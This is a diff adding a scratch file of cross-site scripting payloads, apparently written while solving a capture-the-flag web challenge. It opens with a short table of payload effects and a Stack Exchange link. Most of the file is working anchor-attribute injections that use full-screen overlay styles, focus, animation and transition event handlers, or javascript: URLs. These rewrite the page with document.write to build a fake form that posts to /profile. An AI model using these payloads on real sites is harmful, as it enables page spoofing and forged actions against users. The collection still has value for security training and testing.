@@ -1,0 +1,59 @@
+Payload                    | Effect in DOM      | Effect on page
+======================================================================
+javascript:alert(1);       | "javascript:alert(1);"   | Nothing, nothing when click (blank page)
+"></a><script>alert(1)</script><a "  | "&quot;></a><script>alert(1)</script><a" &#34;=""
+
+
+
+ target
+ 
+ https://security.stackexchange.com/questions/168909/xss-inside-anchor-tag-a-without-user-interaction
+ 
+style=display:block;position:fixed;top:0;left:0;z-index:99999;width:9999px;height:9999px; onmouseover=alert(1)
+
+
+
+window.history.pushState(null,null,'/challenge');document.write('<form action="/profile" method="post"><p><input name="website"><input type="hidden" name="id" value="1"><input type="submit"></p></form>')
+
+quot=String.fromCharCode(34);window.history.pushState(null,null,'/challenge');document.write('<form/action='+quot+'/profile'+quot+'/method='+quot+'post'+quot+'><p><input/name='+quot+'website'+quot+'><input/type='+quot+'hidden'+quot+'/name='+quot+'id'+quot+'/value='+quot+'1'+quot+'><input/type='+quot+'submit'+quot+'></p></form>')
+
+
+style=display:block;position:fixed;top:0;left:0;z-index:99999;width:9999px;height:9999px; onmouseover=quot=String.fromCharCode(34);window.history.pushState(null,null,'/challenge');document.write('<a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><form/action='+quot+'/profile'+quot+'/method='+quot+'post'+quot+'><p><input/name='+quot+'website'+quot+'><input/type='+quot+'hidden'+quot+'/name='+quot+'id'+quot+'/value='+quot+'1'+quot+'><input/type='+quot+'submit'+quot+'></p></form>')
+
+# target=_self style=display:block;position:fixed;top:0;left:0;z-index:99999;width:9999px;height:9999px; onmouseover=quot=String.fromCharCode(34);window.history.pushState(null,null,'/challenge');document.write('<a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><fieldset><form/action='+quot+'/profile'+quot+'/method='+quot+'post'+quot+'><p><input/name='+quot+'website'+quot+'><input/type='+quot+'hidden'+quot+'/name='+quot+'id'+quot+'/value='+quot+'1'+quot+'><input/type='+quot+'submit'+quot+'></p></form></fieldset>')
+
+# target=_self style=animeation:no/0.01s/forwards; onanimationend=quot=String.fromCharCode(34);window.history.pushState(null,null,'/challenge');document.write('<a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><fieldset><form/action='+quot+'/profile'+quot+'/method='+quot+'post'+quot+'><p><input/name='+quot+'website'+quot+'><input/type='+quot+'hidden'+quot+'/name='+quot+'id'+quot+'/value='+quot+'1'+quot+'><input/type='+quot+'submit'+quot+'></p></form></fieldset>')
+
+<a id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></a>
+
+
+# target=_self tabindex=1 style=transition-property:outline;transition-duration:1ms; ontransitionend=quot=String.fromCharCode(34);window.history.pushState(null,null,'/challenge');document.write('<a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><fieldset><form/action='+quot+'/profile'+quot+'/method='+quot+'post'+quot+'><p><input/name='+quot+'website'+quot+'><input/type='+quot+'hidden'+quot+'/name='+quot+'id'+quot+'/value='+quot+'1'+quot+'><input/type='+quot+'submit'+quot+'></p></form></fieldset>')
+
+id=x tabindex=1 onfocusin=alert(1)
+
+# target=_self tabindex=1 id=x onfocusin=quot=String.fromCharCode(34);window.history.pushState(null,null,'/challenge');document.write('<a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><fieldset><form/action='+quot+'/profile'+quot+'/method='+quot+'post'+quot+'><p><input/name='+quot+'website'+quot+'><input/type='+quot+'hidden'+quot+'/name='+quot+'id'+quot+'/value='+quot+'1'+quot+'><input/type='+quot+'submit'+quot+'></p></form></fieldset>')
+
+
+javascript:void(0) target=_self style=display:block;position:fixed;top:0;left:0;z-index:99999;width:9999px;height:9999px; onclick=quot=String.fromCharCode(34);window.history.pushState(null,null,'/challenge');document.write('<a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><fieldset><form/action='+quot+'/profile'+quot+'/method='+quot+'post'+quot+'><p><input/name='+quot+'website'+quot+'><input/type='+quot+'hidden'+quot+'/name='+quot+'id'+quot+'/value='+quot+'1'+quot+'><input/type='+quot+'submit'+quot+'></p></form></fieldset>')
+
+
+
+javascript:quot=String.fromCharCode(34);window.history.pushState(null,null,'/challenge');document.write('<a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><fieldset><form/action='+quot+'/profile'+quot+'/method='+quot+'post'+quot+'><p><input/name='+quot+'website'+quot+'><input/type='+quot+'hidden'+quot+'/name='+quot+'id'+quot+'/value='+quot+'1'+quot+'><input/type='+quot+'submit'+quot+'></p></form></fieldset>') target=_self style=display:block;position:fixed;top:0;left:0;z-index:99999;width:9999px;height:9999px;
+
+
+
+javascript:void(0) target=_self style=display:block;position:fixed;top:0;left:0;z-index:99999;width:9999px;height:9999px; onclick=quot=String.fromCharCode(34);window.history.pushState(null,null,'/challenge');document.write('<a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><fieldset><form/action='+quot+'/profile'+quot+'/method='+quot+'post'+quot+'><p><input/name='+quot+'website'+quot+'><input/type='+quot+'hidden'+quot+'/name='+quot+'id'+quot+'/value='+quot+'1'+quot+'><input/type='+quot+'submit'+quot+'></p></form></fieldset>')
+
+
+
+/challenge target=_self style=display:block;position:fixed;top:0;left:0;z-index:99999;width:9999px;height:9999px;
+
+
+/challenge target=_self style=display:block;position:fixed;top:35;left:145;z-index:99999;width:200px;height:100px;
+
+/challenge target=_self style=display:block;position:fixed;top:35;left:145;z-index:-1;width:200px;height:100px;
+
+javascript:void(0) target=_self style=display:block;position:fixed;top:35;left:145;z-index:999;width:200px;height:100px; onclick=quot=String.fromCharCode(34);window.history.pushState(null,null,'/challenge');document.write('<a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><a/href='+quot+'javascript:void(0)'+quot+'>gibflag</a><fieldset><form/action='+quot+'/profile'+quot+'/method='+quot+'post'+quot+'><p><input/name='+quot+'website'+quot+'><input/type='+quot+'hidden'+quot+'/name='+quot+'id'+quot+'/value='+quot+'1'+quot+'><input/type='+quot+'submit'+quot+'></p></form></fieldset>')
+
+
+/challenge target=_self onclick=document.location='/profile' tabindex=1
